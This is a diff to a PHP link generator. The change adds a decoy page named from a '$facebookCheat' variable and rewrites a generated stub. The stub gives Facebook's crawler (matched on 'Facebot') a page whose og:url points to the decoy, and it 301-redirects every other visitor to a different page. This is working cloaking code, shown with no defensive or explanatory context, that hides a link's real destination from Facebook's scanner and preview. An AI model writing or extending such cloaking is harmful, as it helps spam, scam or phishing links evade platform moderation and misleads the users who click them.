@@ -117,6 +117,7 @@ if ($_POST["url"]) {
     $pathname = generateRandomString();
     $filePhp = $pathname . ".php";
     $fileHtml = $pathname . ".html";
+    $fakeLink = $pathname . ".html";
 
     $tuHtml = './tu/' . $pathname . ".html";
     $minhHtml = './minh/' . $pathname . ".html";
@@ -133,6 +134,7 @@ if ($_POST["url"]) {
     $fTuHtml = fopen($tuHtml, 'w');
     $fMinhHtml = fopen($minhHtml, 'w');
     $fPhucHtml = fopen($phucHtml, 'w');
+    $fFakeLink = fopen($fakeLink, 'w');
 
     $htmlString = "
     <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
@@ -277,6 +279,9 @@ if ($_POST["url"]) {
   </html>
 ';
 
+    fwrite($fFakeLink, $facebookCheat);
+    fclose($fFakeLink);
+
     $phpString = '
 <?php
 if (
@@ -284,12 +289,20 @@ if (
     strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
 ) {
 // header("Location: ' . $fakeLink . '", true, 301);
-echo "' . $facebookCheat . '";
-exit;
+   echo "
+<html>
+<head>
+<meta property=\"og:url\" content=\"' . $fakeLink . '\">
+</head>
+<body>
+</body>
+</html>
+";
+die();
 }
 else {
 header("Location: ' . $fileHtml . '", true, 301);
-exit;
+die();
 }
 ?>
 ';
